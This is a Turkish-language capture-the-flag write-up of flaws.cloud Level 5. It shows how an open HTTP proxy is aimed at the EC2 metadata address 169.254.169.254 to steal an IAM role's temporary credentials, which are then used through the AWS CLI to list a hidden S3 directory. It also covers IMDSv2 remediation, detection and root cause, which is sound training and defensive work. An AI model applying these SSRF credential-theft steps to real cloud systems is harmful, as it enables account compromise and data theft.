# flaws.cloud — Level 5

## 1. Özet

Level 5, önceki level'ların (S3 misconfiguration, EBS snapshot) aksine
klasik bir **SSRF (Server-Side Request Forgery)** senaryosu. Level 4'ü
çözünce açılan sayfada, bu level'daki EC2 üzerinde "basit bir HTTP-only
proxy" çalıştığı söyleniyor — yani bu proxy'ye verilen herhangi bir hedef
adres, sunucu tarafından o adrese bir istek olarak gönderiliyor. Proxy'nin
hangi hedeflere istek atabileceği konusunda bir kısıtlama olmadığı için,
onu **169.254.169.254** — bulut instance'larının kendi metadata servisine
(IMDS) yönlendirmek mümkün. Instance'a bağlı bir IAM Role varsa, IMDS bu
role'ün **geçici (temporary/STS) credential'larını** düz metin JSON olarak
veriyor. Proxy instance'ın **kendi içinde** çalıştığı için bu isteğe izin
veriliyor — ayrıcalık böylece SSRF üzerinden "ödünç alınmış" oluyor. Çalınan
geçici credential'larla level6 bucket'ının gizli bir dizini keşfedilip
içeriği okunabiliyor.

## 2. Kavram: IMDS ve SSRF

`169.254.169.254`, RFC 3927'nin link-local aralığından (`169.254.0.0/16`)
gelen, AWS/Azure/GCP/DigitalOcean gibi neredeyse tüm bulut sağlayıcılarının
her instance'a otomatik tanımladığı bir adrestir. Bu adres internete asla
yönlendirilmez — **sadece instance'ın kendisinden** erişilebilir; bu yüzden
"sihirli IP" olarak anılır. Adresin arkasındaki servis **Instance Metadata
Service (IMDS)**'tir: instance kendi ID'si, AMI'ı, ağ ayarları gibi
bilgileri buradan öğrenir. Instance'a bir **IAM Role** atanmışsa, IMDS bu
role'ün geçici erişim anahtarlarını da (AccessKeyId/SecretAccessKey/Token)
buradan sunar — çünkü instance üzerinde çalışan uygulamaların role'ü
kullanabilmesi için credential'ları bir şekilde alması gerekir.

Bu adres normalde dışarıdan erişilemez olduğu için "güvenli" kabul edilir.
Ama instance üzerinde çalışan herhangi bir servis, dışarıdan verilen bir
URL'e göre **kendi adına** bir istek atıyorsa (bu level'daki proxy gibi),
o servise `169.254.169.254` hedef olarak verildiğinde istek yine
instance'ın içinden gittiği için izin verilir. Bu klasik bir
**SSRF (Server-Side Request Forgery)** zafiyetidir: saldırgan doğrudan
IMDS'e erişemez, ama sunucuyu kendi adına IMDS'e istek atmaya **ikna eder**
ve dönen credential'ları ele geçirir.

## 3. Sömürü (Exploit)

**a) Level 5 görevinin görülmesi**

Level 4'ü geçince açılan sayfanın üst kısmında Level 4'ün "Lesson learned"
metni (snapshot'ların yanlış kullanımı) yer alıyor; altında ise Level 5
görevi tanımlanıyor: EC2 üzerinde HTTP-only bir proxy var ve kullanım
formatı şu şekilde veriliyor:

```
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/<hedef>/
```

Örnekler arasında `proxy/flaws.cloud/`, `proxy/summitroute.com/blog/feed.xml`
ve `proxy/neverssl.com/` var. Görev: `level6-cc4c404a8a8b876167f5e70a7d8c9880
.flaws.cloud` bucket'ının gizli bir dizinini bulmak.

![Level 5 görev sayfası — proxy kullanım örnekleri ve level6 bucket hedefi](../screenshots/level-5_proxy%20hedefaçık.png)

**b) Proxy'nin IMDS'e yönlendirilmesi ve role adının bulunması**

Proxy'nin hedef kısıtlaması olmadığı için, `<hedef>` yerine
`169.254.169.254` verilip IMDS'in `iam/security-credentials/` dizini
listelendi:

```
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/
```

Bu istek, instance'a atanmış IAM Role'ün adının **`flaws`** olduğunu
döndürdü (bu adımın ayrı bir ekran görüntüsü alınmadı; sonucu bir sonraki
adımda role adı doğrudan kullanılarak doğrulandı).

**c) Role'ün geçici credential'larının çalınması**

Bulunan role adı URL'e eklenerek asıl credential JSON'ı istendi:

```
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
```

```json
{
    "Code" : "Success",
    "LastUpdated" : "2026-08-02T15:42:19Z",
    "Type" : "AWS-HMAC",
    "AccessKeyId" : "[REDACTED]",
    "SecretAccessKey" : "[REDACTED]",
    "Token" : "[REDACTED]",
    "Expiration" : "[REDACTED]"
}
```

![Proxy üzerinden IMDS'ten çalınan geçici IAM Role credential'ları (redacted)](../screenshots/level-5-credentials.png)

**Kritik fark — Level 3 ile karşılaştırma:** Level 3'te sızan credential,
`AKIA` ile başlayan **long-term** bir IAM user access key'iydi — süresiz
geçerliydi ve manuel olarak devre dışı bırakılana kadar kullanılabilirdi.
Burada çalınan credential ise `ASIA` ile başlıyor: bu bir **geçici
(temporary/STS)** credential. İki önemli fark var: (1) yanında ayrı bir
**`Token`** (session token) alanı geliyor, (2) bir **`Expiration`** alanı
var — birkaç saat sonra otomatik olarak geçersiz hale geliyor. Bu, IAM
Role tabanlı geçici credential'ların neden long-term user key'lerden daha
güvenli sayıldığının somut kanıtı — ama IMDSv1 (token'sız, eski sürüm) açık
olduğu sürece bu geçici credential'lar da tıpkı long-term key'ler gibi SSRF
ile çalınabiliyor.

**d) Çalınan credential'ların AWS CLI'a yüklenmesi**

Geçici credential'lar ayrı bir profile (`flaws5`) olarak yüklendi:

```bash
aws configure set aws_access_key_id [REDACTED] --profile flaws5
aws configure set aws_secret_access_key [REDACTED] --profile flaws5
aws configure set aws_session_token [REDACTED] --profile flaws5
```

![Geçici credential'ların flaws5 profiline yüklenmesi (redacted)](../screenshots/level-5-credentials-kullan.png)

**Not:** Long-term key'lerden farklı olarak, geçici credential'larda
normal `access_key_id` / `secret_access_key` ikilisine ek olarak
**üçüncü bir alan** (`aws_session_token`) girilmesi **zorunlu** — bu alan
girilmeden credential set eksik/geçersiz kalıyor.

**e) Kimliğin doğrulanması**

```bash
aws sts get-caller-identity --profile flaws5
```

```json
{
    "UserId": "[REDACTED]",
    "Account": "975426262029",
    "Arn": "arn:aws:sts::975426262029:assumed-role/flaws/i-05bef8a081f307783"
}
```

![get-caller-identity çıktısı — assumed-role/flaws/i-05bef8a081f307783](../screenshots/level-5-idenity.png)

`Arn` alanındaki **`assumed-role`** ifadesi, bu credential'ların bir IAM
**user**'a değil, flaws.cloud hesabındaki bir EC2 instance'ına
(`i-05bef8a081f307783`) atanmış **`flaws`** adlı IAM **Role**'e ait
olduğunu doğruluyor.

**f) Level 6 bucket'ında gizli dizinin bulunması**

```bash
aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --profile flaws5
```

```
                           PRE ddcc78ff/
2017-02-27 05:11:07        871 index.html
```

```bash
aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/ --profile flaws5
```

```
2017-03-03 07:36:23       2463 hint1.html
2017-03-03 07:36:23       2080 hint2.html
2020-05-22 21:42:20       2924 index.html
```

![level6 bucket listelemesi — gizli ddcc78ff/ dizininin bulunması](../screenshots/level-5-keşif.png)

**g) Flag**

`ddcc78ff/index.html` tarayıcıda açıldığında Level 6 sayfası göründü —
level başarıyla tamamlandı:

![ddcc78ff/index.html açıldı — flAWS Level 6 sayfası](../screenshots/level-5-flag.png)

flaws.cloud'un bu level için verdiği "Lesson learned" metnini kendi
cümlelerimle özetlersem:

- `169.254.169.254` bulut dünyasında ortak kullanılan bir "sihirli IP" —
  AWS, Azure, Google, DigitalOcean gibi sağlayıcıların hepsi bu adresi
  metadata servisi için kullanıyor.
- Google gibi bazı sağlayıcılar isteğe ek header zorunluluğu getiriyor
  (`Metadata-Flavor: Google`); AWS'in IMDSv2'si de özel header +
  challenge-response gerektiriyor, ama bu **birçok hesapta zorunlu
  kılınmamış** durumda (varsayılan ayar "Optional").
- Gerçek dünya örneği: Nicolas Grégoire, Prezi'nin sunuculara URL
  gösterme özelliğini `169.254.169.254`'e yönlendirerek EC2 instance
  profile access key'ini ele geçirmiş; benzer sorunlar Phabricator ve
  Coinbase'de de bulunmuş.
- Benzer bir risk: EC2 user-data'sına konan secret'lar da aynı yoldan
  (IMDS üzerinden) çalınabiliyor.
- Önlem: uygulamaların `169.254.169.254`'e ya da herhangi bir local/private
  IP aralığına erişmesine izin vermemek; IAM Role'leri mümkün olduğunca
  kısıtlı (least-privilege) tutmak.

## 4. Önleme (Remediation)

flaws.cloud'un EC2 instance'ında IMDSv2 büyük ihtimalle **"Optional"**
(zorunlu değil) ayarında bırakılmış — bu yüzden proxy üzerinden atılan
token'sız basit bir GET isteği (SSRF senaryosunda saldırganın genelde
yapabildiği tek şey budur) credential'ları çalmaya yetti.

Bunu kendi test ortamımda doğrulamak için ayrı bir EC2 instance
(`i-00dcb604ec5b36925`, adı "level-5") oluşturdum ve Console üzerinden
**Actions → Instance settings → Modify instance metadata options** ile
**IMDSv2: Required** olarak ayarladım:

![Kendi test instance'ım — Instance summary, IMDSv2: Required](../screenshots/level-5-IMDSv2.png)

**Doğrulama 1 — token'sız istek artık reddediliyor:**

Instance'a SSH ile bağlanılıp (`ssh -i level-5key.pem ec2-user@54.213.179.157`)
eski usül (token'sız, IMDSv1 tarzı) bir istek denendi:

```bash
curl -v http://169.254.169.254/latest/meta-data/
```

Sonuç:

```
< HTTP/1.1 401 Unauthorized
< Content-Length: 0
```

![IMDSv2 Required sonrası token'sız curl isteği — 401 Unauthorized](../screenshots/level-5-önleme-401.png)

Bu, önlemenin çalıştığının doğrudan kanıtı: SSRF'in genelde yapabildiği
"basit GET isteği" artık IMDSv2 Required ile başarısız oluyor.

**Doğrulama 2 — doğru protokolle (token ile) erişim hâlâ mümkün:**

Aynı instance'ta bu sefer `ec2-metadata --all` aracı kullanıldı (bu araç
arka planda önce bir `PUT` isteğiyle token alıp, ardından bu token'ı
header'da göndererek IMDSv2 uyumlu istek yapıyor):

```bash
ec2-metadata --all
```

Sonuç: başarılı — tam metadata listesi döndü (`ami-id`, `instance-id`,
`instance-type: t3.micro`, `public-ipv4: 54.213.179.157`,
`security-groups: launch-wizard-2` vb.):

![ec2-metadata --all çıktısı — IMDSv2 token ile başarılı erişim](../screenshots/level-5-metadata.png)

Bu ikinci test önemli bir ayrımı gösteriyor: doğru protokolle (önce `PUT`
ile token alıp sonra `GET` isteğinde bu token'ı header'a koyarak) erişim
hâlâ mümkün — ama bir SSRF/proxy zafiyeti genelde saldırgana sadece basit
bir GET/URL yönlendirmesi yaptırabiliyor, kendi başına önce bir `PUT`
isteği atıp token alma adımını çoğu senaryoda çalıştıramıyor. Bu yüzden
IMDSv2 Required, SSRF üzerinden credential çalınmasına karşı pratikte
etkili bir engel oluyor.

CLI karşılığı (Console yerine tek komutla):

```bash
aws ec2 modify-instance-metadata-options --instance-id i-00dcb604ec5b36925 \
  --http-tokens required --http-endpoint enabled --region us-west-2
```

| | flaws.cloud (açık) | Kendi test ortamım (düzeltilmiş) |
|---|---|---|
| IMDSv2 | Optional (varsayılan) | Required |
| SSRF ile token'sız istek | Başarılı → credential çalındı | 401 Unauthorized |
| Token ile (doğru protokol) istek | — | Başarılı (`ec2-metadata --all`) |

## 5. Tespit (Detection)

- **CloudTrail:** `GetCallerIdentity` ya da S3/EC2 API çağrılarının bir
  `assumed-role` üzerinden, ama normalde bu role'ü kullanmayan bir
  kaynaktan/user-agent'tan gelmesi anomali sinyalidir — özellikle
  role'ün ARN'inde geçen instance ID ile çağrıyı yapan kaynağın
  tutarsız olması dikkat çekmeli.
- **VPC Flow Logs:** EC2'den `169.254.169.254`'e giden trafik normalde
  sadece kendi init/boot süreçlerinde (cloud-init, ajanlar vb.) oluşur;
  bir web uygulaması sürecinden (nginx/proxy) bu adrese giden istekler
  şüphelidir.
- **GuardDuty:** `UnauthorizedAccess:EC2/MetadataDNSRebind` gibi SSRF/IMDS
  istismarına yönelik bulgu tipleri bu senaryoyu yakalayabilir.
- IMDSv2 zorunlu kılınmışsa, saldırının **401 ile başarısız olması** da
  log'larda görünür hale gelir — bu hem önleme hem "başarısız girişim"
  olarak ayrı bir tespit kaydı bırakır.

## 6. Kendi Test Ortamı Kanıtı

Kendi hesabımda ayrı bir EC2 instance (`i-00dcb604ec5b36925`) üzerinde
flaws.cloud'un senaryosunun tersi kuruldu: IMDSv2 **Required** olarak
ayarlandı ve ground-truth olarak doğrulandı — token'sız istek **401
Unauthorized** ile reddedildi, token'lı (doğru protokol) istek ise
`ec2-metadata --all` üzerinden **başarılı** oldu. Bu, IMDSv2'nin SSRF
üzerinden yapılan token'sız credential çalma girişimlerine karşı gerçekten
etkili bir engel olduğunu doğrudan gösterdi.

## 7. Kök Neden (Paylaşılan Sorumluluk)

Bu açık iki ayrı müşteri-tarafı hatanın birleşimi:

- **(a) Uygulama tasarımı:** Proxy'nin herhangi bir hedefe (iç IP'ler
  dahil) istek atabilmesine izin verilmesi — bu ayrı bir uygulama
  seviyesi tasarım hatası. Proxy, `169.254.169.254` gibi link-local ve
  diğer private IP aralıklarını (`10.0.0.0/8`, `172.16.0.0/12`,
  `192.168.0.0/16` vb.) reddedecek bir allowlist/denylist içermeliydi.
- **(b) Instance yapılandırması:** IMDSv2'yi zorunlu kılmamak bir
  yapılandırma tercihidir. AWS bu korumayı **sunar** ama varsayılan olarak
  **dayatmaz** — flaws.cloud'un kendi Level 6 sayfasındaki metninde de bu
  açıkça belirtiliyor ("many AWS accounts may not have enforced it").

AWS Paylaşılan Sorumluluk Modeli çerçevesinde: AWS, IMDSv2 gibi bir
korumayı platform seviyesinde sağlar (kendi test ortamımda gösterildiği
gibi tek bir ayarla zorunlu kılınabiliyor), ama bunu açık/kapalı bırakmak
ve uygulama seviyesinde SSRF'e karşı hedef doğrulaması yapmak tamamen
müşterinin sorumluluğunda kalıyor — bu "security **of** the cloud" değil,
"security **in** the cloud" kategorisinde bir hata.
